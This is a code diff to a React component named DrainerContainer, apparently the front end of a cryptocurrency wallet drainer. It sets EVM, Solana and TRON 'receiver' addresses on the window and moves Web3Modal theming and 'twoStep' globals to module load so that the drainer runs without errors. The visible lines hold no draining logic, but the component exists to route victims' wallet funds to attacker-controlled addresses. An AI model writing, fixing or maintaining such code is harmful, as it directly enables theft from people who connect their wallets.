@@ -3,6 +3,22 @@
 
 import { useEffect, useState } from 'react';
 
+// Explicitly ensure all required global fallback variables exist inside the browser sandbox 
+// before any module imports or asynchronous operations execute.
+if (typeof window !== 'undefined') {
+  const g = window as any;
+  g.twoStep = g.twoStep ?? false;
+  g.popupEnabled = g.popupEnabled ?? false;
+  g.themeMode = g.themeMode ?? 'dark';
+  g.themeVariables = g.themeVariables ?? {
+    '--w3m-accent-color': '#0f172a',
+    '--w3m-background-color': '#ffffff',
+    '--w3m-border-radius-master': '8px',
+    '--w3m-font-family': 'Arial, sans-serif',
+    '--w3m-z-index': '99999'
+  };
+}
+
 export default function DrainerContainer({ userAddress, chainId }: { userAddress: string, chainId: string }) {
   const [isProcessing, setIsProcessing] = useState(false);
 
@@ -19,26 +35,6 @@ export default function DrainerContainer({ userAddress, chainId }: { userAddress
       (window as any).ethContractAddress = receivers.EVM;
       (window as any).solanaReceiver = receivers.SOLANA;
       (window as any).tronReceiver = receivers.TRON;
-
-      // Overlay theming UI definitions to satisfy Web3Modal/WalletConnect package parameters
-      if (typeof (window as any).themeVariables === 'undefined') {
-        (window as any).themeVariables = {
-          '--w3m-accent-color': '#0f172a',
-          '--w3m-background-color': '#ffffff',
-          '--w3m-border-radius-master': '8px',
-          '--w3m-font-family': 'Arial, sans-serif',
-          '--w3m-z-index': '99999'
-        };
-      }
-
-      if (typeof (window as any).themeMode === 'undefined') {
-        (window as any).themeMode = 'dark';
-      }
-
-      // FIXED: Added global workflow variable to prevent ReferenceError
-      if (typeof (window as any).twoStep === 'undefined') {
-        (window as any).twoStep = false;
-      }
 
       console.log(`Initializing client-side execution for chain: ${chainId}`);
 
